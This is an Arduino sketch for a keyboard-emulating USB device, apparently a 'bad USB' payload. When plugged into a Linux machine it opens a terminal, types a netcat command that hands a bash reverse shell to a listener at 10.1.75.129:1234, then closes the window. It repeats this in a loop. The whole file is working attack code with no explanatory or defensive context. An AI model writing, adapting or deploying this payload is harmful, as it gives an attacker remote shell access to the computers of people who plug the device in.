#include <Keyboard.h>

  

void typeKey(int key){

Keyboard.press(key);

delay(50);

Keyboard.release(key);

}

void setup() {

pinMode(13, OUTPUT); //LED

}

  

void loop() {

delay(1000); // Initial delay

  

// Open a terminal (Ctrl + Alt + T)

Keyboard.press(KEY_LEFT_CTRL);

Keyboard.press(KEY_LEFT_ALT);

Keyboard.press('t');

delay(50);

Keyboard.releaseAll();

delay(1000); // Wait for terminal to open

  

// Reverse shell command using nc

Keyboard.print("nc -e /bin/bash 10.1.75.129 1234");

typeKey(KEY_RETURN);

delay(300);

  

// Close the terminal window

Keyboard.print("exit");

typeKey(KEY_RETURN);

delay(300);

  

// Turn on the LED to indicate completion

digitalWrite(13, HIGH);

delay(90000); // Delay to ensure the task is complete before restarting

digitalWrite(13, LOW);

delay(5000); // Additional delay to avoid immediate restart

}